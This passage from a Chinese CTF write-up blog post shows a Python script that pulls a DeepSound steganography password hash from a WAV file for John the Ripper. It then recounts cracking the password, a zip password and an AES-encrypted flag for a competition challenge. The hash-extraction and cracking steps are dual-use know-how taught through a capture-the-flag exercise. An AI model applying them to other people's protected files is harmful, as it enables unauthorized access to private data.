class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_data_low</span><span class="params">(buf)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> buf[::<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_data_normal</span><span class="params">(buf)</span>:</span></span><br><span class="line">  out = bytearray()</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(buf), <span class="number">4</span>):</span><br><span class="line">    out.append((buf[i] &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span> | (buf[i + <span class="number">2</span>] &amp; <span class="number">15</span>))</span><br><span class="line">  <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_data_high</span><span class="params">(buf)</span>:</span></span><br><span class="line">  out = bytearray()</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(buf), <span class="number">8</span>):</span><br><span class="line">    out.append((buf[i] &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>     | (buf[i + <span class="number">2</span>] &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span> \</span><br><span class="line">             | (buf[i + <span class="number">4</span>] &amp; <span class="number">3</span>) &lt;&lt; <span class="number">2</span> | (buf[i + <span class="number">6</span>] &amp; <span class="number">3</span>))</span><br><span class="line">  <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_magic</span><span class="params">(buf)</span>:</span></span><br><span class="line">  <span class="comment"># This is a more efficient way of testing for the `DSCF` magic header without</span></span><br><span class="line">  <span class="comment"># decoding the whole buffer</span></span><br><span class="line">  <span class="keyword">return</span> (buf[<span class="number">0</span>] &amp; <span class="number">15</span>)  == (<span class="number">68</span> &gt;&gt; <span class="number">4</span>) <span class="keyword">and</span> (buf[<span class="number">2</span>]  &amp; <span class="number">15</span>) == (<span class="number">68</span> &amp; <span class="number">15</span>) \</span><br><span class="line">     <span class="keyword">and</span> (buf[<span class="number">4</span>] &amp; <span class="number">15</span>)  == (<span class="number">83</span> &gt;&gt; <span class="number">4</span>) <span class="keyword">and</span> (buf[<span class="number">6</span>]  &amp; <span class="number">15</span>) == (<span class="number">83</span> &amp; <span class="number">15</span>) \</span><br><span class="line">     <span class="keyword">and</span> (buf[<span class="number">8</span>] &amp; <span class="number">15</span>)  == (<span class="number">67</span> &gt;&gt; <span class="number">4</span>) <span class="keyword">and</span> (buf[<span class="number">10</span>] &amp; <span class="number">15</span>) == (<span class="number">67</span> &amp; <span class="number">15</span>) \</span><br><span class="line">     <span class="keyword">and</span> (buf[<span class="number">12</span>] &amp; <span class="number">15</span>) == (<span class="number">70</span> &gt;&gt; <span class="number">4</span>) <span class="keyword">and</span> (buf[<span class="number">14</span>] &amp; <span class="number">15</span>) == (<span class="number">70</span> &amp; <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_wave</span><span class="params">(buf)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> buf[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">b'RIFF'</span> <span class="keyword">and</span> buf[<span class="number">8</span>:<span class="number">12</span>] == <span class="string">b'WAVE'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_deepsound_file</span><span class="params">(f)</span>:</span></span><br><span class="line">  bname = os.path.basename(f.name)</span><br><span class="line">  logger = logging.getLogger(bname)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Check if it's a .wav file</span></span><br><span class="line">  buf = f.read(<span class="number">12</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> is_wave(buf):</span><br><span class="line">    <span class="keyword">global</span> convert_warn</span><br><span class="line">    logger.error(<span class="string">'file not in .wav format'</span>)</span><br><span class="line">    convert_warn = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  f.seek(<span class="number">0</span>, os.SEEK_SET)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Scan for the marker...</span></span><br><span class="line">  hdrsz = <span class="number">104</span></span><br><span class="line">  hdr = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    off = f.tell()</span><br><span class="line">    buf = f.read(hdrsz)</span><br><span class="line">    <span class="keyword">if</span> len(buf) &lt; hdrsz: <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_magic(buf):</span><br><span class="line">          hdr = decode_data_normal(buf)</span><br><span class="line">          logger.info(<span class="string">'found DeepSound header at offset %i'</span>, off)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    f.seek(-hdrsz + <span class="number">1</span>, os.SEEK_CUR)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> hdr <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    logger.warn(<span class="string">'does not appear to be a DeepSound file'</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Check some header fields</span></span><br><span class="line">  mode = hdr[<span class="number">4</span>]</span><br><span class="line">  encrypted = hdr[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">  modes = &#123;<span class="number">2</span>: <span class="string">'low'</span>, <span class="number">4</span>: <span class="string">'normal'</span>, <span class="number">8</span>: <span class="string">'high'</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> mode <span class="keyword">in</span> modes:</span><br><span class="line">    logger.info(<span class="string">'data is encoded in %s-quality mode'</span>, modes[mode])</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    logger.error(<span class="string">'unexpected data encoding mode %i'</span>, modes[mode])</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> encrypted == <span class="number">0</span>:</span><br><span class="line">    logger.warn(<span class="string">'file is not encrypted'</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">elif</span> encrypted != <span class="number">1</span>:</span><br><span class="line">    logger.error(<span class="string">'unexpected encryption flag %i'</span>, encrypted)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  sha1 = hdr[<span class="number">6</span>:<span class="number">6</span>+<span class="number">20</span>]</span><br><span class="line">  print(<span class="string">'%s:$dynamic_1529$%s'</span> % (bname, sha1.hex()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  <span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">  parser = argparse.ArgumentParser()</span><br><span class="line">  parser.add_argument(<span class="string">'--verbose'</span>, <span class="string">'-v'</span>, action=<span class="string">'store_true'</span>)</span><br><span class="line">  parser.add_argument(<span class="string">'files'</span>, nargs=<span class="string">'+'</span>, metavar=<span class="string">'file'</span>,</span><br><span class="line">    type=argparse.FileType(<span class="string">'rb'</span>, bufsize=<span class="number">4096</span>))</span><br><span class="line">  args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> args.verbose:</span><br><span class="line">    logging.basicConfig(level=logging.INFO)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    logging.basicConfig(level=logging.WARN)</span><br><span class="line"></span><br><span class="line">  convert_warn = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> f <span class="keyword">in</span> args.files:</span><br><span class="line">    process_deepsound_file(f)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> convert_warn:</span><br><span class="line">    print(textwrap.dedent(<span class="string">'''</span></span><br><span class="line"><span class="string">    ---------------------------------------------------------------</span></span><br><span class="line"><span class="string">    Some files were not in .wav format. Try converting them to .wav</span></span><br><span class="line"><span class="string">    and try again. You can use: ffmpeg -i input output.wav</span></span><br><span class="line"><span class="string">    ---------------------------------------------------------------</span></span><br><span class="line"><span class="string">    '''</span>.rstrip()), file=sys.stderr)</span><br></pre></td></tr></table></figure></p>
<p>然后再用john跑一下获得的密码<br>最终发现deepsound的密码是qwertyuiop</p>
<p>发现flag尝试导出，并且在目录中发现了压缩包密码：<code>&amp;sf8823*/@</code><br>flag多次base64之后，发现是一串AES字符串<br>U2FsdGVkX18y3W4CGIjoHFDovK2bPWbYmsGuXnWGVmdVrpWZkT+m+qDWgel6KAEf%0AQRJk7f6EVzt5FGWMexokBA%3D%3D</p>
<p>最后根据精灵语解码发现最后的KEY是：<code>KEYISHERE</code><br><img src="https://s1.ax1x.com/2020/09/16/w22pD0.png" alt="w22pD0.png"><br>然后AES解密得到flag<br><img src="https://s1.ax1x.com/2020/09/16/w22cMn.png" alt="w22cMn.png"></p>

      </div>
        
          <section class="meta" id="footer-meta">
            
              <time class="metatag time" itemprop="dateUpdated" datetime="2020-09-16T23:44:32+08:00" content="2020-09-16"><i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>
                &nbsp;2020-09-16
              </time>
            
            
                
                <div class="metatag tags"><a class="tag" href="/tags/比赛wp/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>&nbsp;比赛wp</a></div>
            
            
              
  <div class="metatag share -mob-share-list">
    <i class="left fas fa-share-alt fa-fw" aria-hidden="true"></i>
    <div class="-mob-share-list share-body">
      
        
          <a class="-mob-share-qq" title="QQ好友" rel="external nofollow noopener noreferrer" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.r1ght0us.xyz/2020/09/16/2020天山固网杯wp/&title=2020天山固网杯wp | R1ght0us's Blog&summary=web题恶心的离谱,期待官方wp">
            
              <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qq.png">
            
          </a>
        
      
        
          <a class="-mob-share-qzone" title="QQ空间" rel="external nofollow noopener noreferrer" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.r1ght0us.xyz/2020/09/16/2020天山固网杯wp/&title=2020天山固网杯wp | R1ght0us's Blog&summary=web题恶心的离谱,期待官方wp">
            
              <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qzone.png">
            
          </a>
        
      
        
          <a class="qrcode" rel="external nofollow noopener noreferrer" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACt0lEQVR42u3aQW7CUAwFQO5/aSp1VQkIz/Y3qNJkhVIaMlnElv1ut/i4/x6Pn6//+vjN6/Ovvvn3uG0ceHh4eK1bf3XkgIT96jvJ+VdXe/MI8PDw8NZ4k2JwfT4vFb3y8+au8PDw8L7Ku3419xr0/DweHh7ef+T1mt3JgOPAmAMPDw9vjZcMI5IjGTGcGhAfnrXg4eHhxbzJAuxbnz+038PDw8MrbtV7pSL5a6+xLt8nHh4e3gLvuv3Ni0RvWTVpsgsFAw8PD2+BV21kk5d+Mp7oBbB6Iw88PDy8U7z52DQPFlz/b1KikmDBk2YaDw8P7ygvv/VqgKD6gPICkNwnHh4e3h5ve5E/CVRVS8io7uHh4eEVefN2uVoYeuPd8uAYDw8P74O8s2GsCaZ6tSgZgYeHhzfmVRvfXmOdD17zIUXz2ePh4eENeJN2NmnHD7fIrZKDh4eHt82bBKpyTDVekCCT8AEeHh7enJePAPKfrLbgvQFEdE08PDy8Nd5kwNpbklUXb82YAh4eHt4ab7Rkaq2yckyvMBQWYHh4eHhFXv5a75WH6uPo4d+cwcPDwzvKq44G5nPifEBcHR8/+YyHh4f3QV7ygt5omquhgcKUGg8PD2+BN1lBnR34JgUgChzg4eHhLfCSuFUeDiiMVlvBgur94OHh4W3zei3sPFyVh7eaJDw8PLwFXu9yeQSqMHgtlp9oxIyHh4e3xuu90OchgGpAoRrzwsPDwzvLuxePPCJQXaQl0YRy+cHDw8Nb4J196efDhcnvVvF4eHh4G7zq8r63rJqPjJtRMDw8PLw13vylXG2p82BWXkIKyTI8PDy8j/OqLXUvZJCMQt7cDx4eHt5Xeb08Vx7eyn+9cE08PDy8NV4en0p4SUOcr9yaMDw8PLw1XnURlQ8Reo+p+p35mg0PDw8v5v0Aycm7YFUOPJkAAAAASUVORK5CYII=">
          
            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/wechat.png">
          
          </a>
        
      
        
          <a class="-mob-share-weibo" title="微博" rel="external nofollow noopener noreferrer" href="http://service.weibo.com/share/share.php?url=http://www.r1ght0us.xyz/2020/09/16/2020天山固网杯wp/&title=2020天山固网杯wp | R1ght0us's Blog&summary=web题恶心的离谱,期待官方wp">
            
              <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/weibo.png">
            
          </a>
        
      
    </div>
  </div>


            
          </section>
        

        
            <div class="prev-next">
                
                
                    <section class="next">
                        <span class="art-item-right" aria-hidden="true">
                            <h6>下一页&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i></h6>
                            <h4>
                                <a href="/2020/07/21/Thinkphp5-x-RCE复现/" rel="prev" title="Thinkphp5.x_RCE复现">
                                    
                                        Thinkphp5.x_RCE复现
                                    
                                </a>
                            </h4>
                            
                                
                                <h6 class="tags">
                                    <a class="tag" href="/tags/ThinkPHP/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>ThinkPHP</a> <a class="tag" href="/tags/PHP/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>PHP</a> <a class="tag" href="/tags/RCE复现/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>RCE复现</a>
                                </h6>
                            
                        </span>
                    </section>
                
            </div>
        

    </section>

</article>

<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->


<br>

<!-- 显示推荐文章和评论 -->



  <article class="post white-box comments">
    <section class="article typo">

      
        

    <div class="recommended_posts">
        <h4><i class="fas fa-bookmark fa-fw" aria-hidden="true"></i>&nbsp;相关文章</h4>
        <ul>
            
                <li><a href="http://www.r1ght0us.xyz/2020/07/21/Thinkphp5-x-RCE复现/">Thinkphp5.x_RCE复现</a></li>
            
                <li><a href="http://www.r1ght0us.xyz/2020/07/13/ThinkPHP5底层代码逻辑梳理/">ThinkPHP5底层代码逻辑梳理</a></li>
            
                <li><a href="http://www.r1ght0us.xyz/2020/05/27/2018西普杯铁三流量分析/">2018西普杯铁三流量分析</a></li>
            
                <li><a href="http://www.r1ght0us.xyz/2020/02/17/DVWA靶场-常见漏洞原理以及防御/">DVWA靶场-常见漏洞原理以及防御</a></li>
            
        </ul>
    </div>


      

      
        <h4><i class="fas fa-comments fa-fw" aria-hidden="true"></i>&nbsp;评论</h4>
        
        
        
          
            <section id="comments">
              <div id="valine_container" class="valine_thread">
                <i class="fas fa-spinner fa-spin fa-fw"></i>
              </div>
            </section>
          
        
      
    </section>
  </article>



<script>
    window.subData = {
        title: '2020天山固网杯wp',
        tools: true
    }
</script>


        </div>
        <aside class='l_side'>
            
  
  
    
      
      
        <section class="author">
  <div class="content pure">
    
      <div class="avatar">
        <img class="avatar" src="/images/header.png">
      </div>
    
    
      <div class="text">
        
        
        
          <p><span id="jinrishici-sentence">R1ght0us's Blog</span></p>
          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
        
      </div>
    
    
      <div class="social-wrapper">
        
          
            <a href="https://github.com/ssb6666" class="social flat-btn" target="_blank" rel="external"><i class="social fab fa-github" aria-hidden="true"></i></a>
          
        
          
            <a href="https://blog.csdn.net/qq_39495209" class="social flat-btn" target="_blank" rel="external"><i class="social fas fa-flag" aria-hidden="true"></i></a>
          
        
      </div>
    
  </div>
</section>

      
    
  
    
      
      
        <section class="plain">
  
<header class="pure">
  <div><i class="fas fa-bullhorn fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;</div>
  
</header>

  <div class="content pure">
    <p>但愿这里能让你获益颇多</p>

  </div>
</section>

      
    
  
    
      
      
        
  <section class="category">
    
<header class="pure">
  <div><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;所有分类</div>
  
</header>

    <div class="content pure">
      <ul class="entry">
        
          <li><a class="flat-box" title="/categories/CTF/" href="/categories/CTF/"><div class="name">CTF</div><div class="badge">(5)</div></a></li>
        
          <li><a class="flat-box" title="/categories/XML注入/" href="/categories/XML注入/"><div class="name">XML注入</div><div class="badge">(1)</div></a></li>
        
          <li><a class="flat-box" title="/categories/hexo/" href="/categories/hexo/"><div class="name">hexo</div><div class="badge">(1)</div></a></li>
        
          <li><a class="flat-box" title="/categories/python编程/" href="/categories/python编程/"><div class="name">python编程</div><div class="badge">(6)</div></a></li>
        
          <li><a class="flat-box" title="/categories/代码审计/" href="/categories/代码审计/"><div class="name">代码审计</div><div class="badge">(2)</div></a></li>
        
          <li><a class="flat-box" title="/categories/靶场/" href="/categories/靶场/"><div class="name">靶场</div><div class="badge">(1)</div></a></li>
        
      </ul>
    </div>
  </section>


      
    
  
    
      
      
        
  <section class="tagcloud">
    
<header class="pure">
  <div><i class="fas fa-fire fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;热门标签</div>
  
</header>

    <div class="content pure">
      <a href="/tags/CRYPTO/" style="font-size: 14px; color: #999">CRYPTO</a> <a href="/tags/DVWA/" style="font-size: 14px; color: #999">DVWA</a> <a href="/tags/Git/" style="font-size: 14px; color: #999">Git</a> <a href="/tags/MISC/" style="font-size: 19px; color: #777">MISC</a> <a href="/tags/PHP/" style="font-size: 16.5px; color: #888">PHP</a> <a href="/tags/RCE复现/" style="font-size: 14px; color: #999">RCE复现</a> <a href="/tags/SQLinjection/" style="font-size: 16.5px; color: #888">SQLinjection</a> <a href="/tags/ThinkPHP/" style="font-size: 16.5px; color: #888">ThinkPHP</a> <a href="/tags/XML/" style="font-size: 14px; color: #999">XML</a> <a href="/tags/XXE/" style="font-size: 14px; color: #999">XXE</a> <a href="/tags/debug/" style="font-size: 14px; color: #999">debug</a> <a href="/tags/flask/" style="font-size: 21.5px; color: #666">flask</a> <a href="/tags/hexo常见问题/" style="font-size: 14px; color: #999">hexo常见问题</a> <a href="/tags/kali/" style="font-size: 14px; color: #999">kali</a> <a href="/tags/netcat/" style="font-size: 14px; color: #999">netcat</a> <a href="/tags/python/" style="font-size: 24px; color: #555">python</a> <a href="/tags/python3/" style="font-size: 14px; color: #999">python3</a> <a href="/tags/基础课件/" style="font-size: 14px; color: #999">基础课件</a> <a href="/tags/手动注入/" style="font-size: 14px; color: #999">手动注入</a> <a href="/tags/比赛wp/" style="font-size: 19px; color: #777">比赛wp</a> <a href="/tags/流量分析/" style="font-size: 14px; color: #999">流量分析</a> <a href="/tags/盲水印/" style="font-size: 14px; color: #999">盲水印</a> <a href="/tags/程序基础/" style="font-size: 14px; color: #999">程序基础</a>
    </div>
  </section>


      
    
  
    
      
      
        <section class="list">
  
<header class="pure">
  <div><i class="fas fa-link fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;友链</div>
  
</header>

  <div class="content pure">
    <ul class="entry">
      
        <li><a class="flat-box" title="http://xjusec.club:886" href="http://xjusec.club:886">
          <div class="name">
            
              <i class="fas fa-external-link-square fa-fw" aria-hidden="true"></i>
            
            &nbsp;&nbsp;XJUSEC_CTF
          </div>
          
        </a></li>
      
        <li><a class="flat-box" title="https://blog.csdn.net/qq_40648358/" href="https://blog.csdn.net/qq_40648358/">
          <div class="name">
            
              <i class="fas fa-external-link-square fa-fw" aria-hidden="true"></i>
            
            &nbsp;&nbsp;RDD_NULL
          </div>
          
        </a></li>
      
        <li><a class="flat-box" title="http://www.kittener.top" href="http://www.kittener.top">
          <div class="name">
            
              <i class="fas fa-external-link-square fa-fw" aria-hidden="true"></i>
            
            &nbsp;&nbsp;KITTENER
          </div>
          
        </a></li>
      
    </ul>
  </div>
</section>

      
    
  
    
      
      
        
  <section class="toc-wrapper">
    
<header class="pure">
  <div><i class="fas fa-list fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;文章目录</div>
  
    <div class="wrapper"><a class="s-toc rightBtn" rel="external nofollow noopener noreferrer" href="javascript:void(0)"><i class="fas fa-thumbtack fa-fw"></i></a></div>
  
</header>

    <div class="content pure">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-ssrf"><span class="toc-text">ez_ssrf</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re"><span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pyreverse"><span class="toc-text">pyreverse</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ddstack"><span class="toc-text">ddstack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnxzd"><span class="toc-text">pwnxzd</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#more-and-more"><span class="toc-text">more_and_more</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyPy"><span class="toc-text">EasyPy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BaseBase"><span class="toc-text">BaseBase</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寻找上古之森的秘密"><span class="toc-text">寻找上古之森的秘密</span></a></li></ol></li></ol>
    </div>
  </section>


      
    
  


        </aside>
        <script>setLoadingBarProgress(60);</script>
    </div>
    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
    </div>
    <footer id="footer" class="clearfix">
  
    <div class="social-wrapper">
      
        
          <a href="https://github.com/ssb6666" class="social fab fa-github flat-btn" target="_blank" rel="external"></a>
        
      
        
          <a href="https://blog.csdn.net/qq_39495209" class="social fas fa-flag flat-btn" target="_blank" rel="external"></a>
        
      
    </div>
  
  <br>
  <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
</div>
  <div>本站使用 <a href="https://xaoxuu.com/wiki/material-x/" target="_blank" class="codename">Material X</a> 作为主题，总访问量为 <span id="busuanzi_value_site_pv"><i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span> 次。
  </div>
</footer>

    <script>setLoadingBarProgress(80);</script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>

  <script>
    var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
    var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
    var ALGOLIA_API_KEY = "";
    var ALGOLIA_APP_ID = "";
    var ALGOLIA_INDEX_NAME = "";
    var AZURE_SERVICE_NAME = "";
    var AZURE_INDEX_NAME = "";
    var AZURE_QUERY_KEY = "";
    var BAIDU_API_ID = "";
    var SEARCH_SERVICE = "hexo" || "hexo";
    var ROOT = "/"||"/";
    if(!ROOT.endsWith('/'))ROOT += '/';
  </script>


  
    <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.5/dist/scrollreveal.min.js"></script>
    <script type="text/javascript">
      $(function() {
        const $reveal = $('.reveal');
    		if ($reveal.length === 0) return;
    		const sr = ScrollReveal({ distance: 0 });
    		sr.reveal('.reveal');
      });
    </script>
  
  
    <script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
    <script type="text/javascript">
      $(function() {
        Waves.attach('.flat-btn', ['waves-button']);
        Waves.attach('.float-btn', ['waves-button', 'waves-float']);
        Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
        Waves.attach('.flat-box', ['waves-block']);
        Waves.attach('.float-box', ['waves-block', 'waves-float']);
        Waves.attach('.waves-image');
        Waves.init();
      });
    </script>
  
  
    <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
  
  
  


  
  
  
    
      
      
      
        
          <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
          
            
              <script src="https://cdn.jsdelivr.net/gh/xaoxuu/volantis@1/js/volantis.min.js"></script>
            
          
          <script>
          var GUEST_INFO = ['nick','mail','link'];
          var guest_info = 'nick,mail,link'.split(',').filter(function(item){
            return GUEST_INFO.indexOf(item) > -1
          });
          var notify = 'false' == true;
          var verify = 'false' == true;
          var valine = new Valine();
          valine.init({
            el: '#valine_container',
            notify: notify,
            verify: verify,
            guest_info: guest_info,
            
            appId: "oss58Ms641c57OCAYSuXAwDF-MdYXbMMI",
            appKey: "oNW9OxduWTRga9cS7i1PL8Jt",
            placeholder: "交流使人进步",
            pageSize:'10',
            avatar:'monsterid',
            lang:'zh-cn',
            highlight:''
          })
          </script>
        
      
    
  
  
    <script src="/js/app.js"></script>
<script src="/js/search.js"></script>
  






    <script>setLoadingBarProgress(100);</script>
</body>
</html>
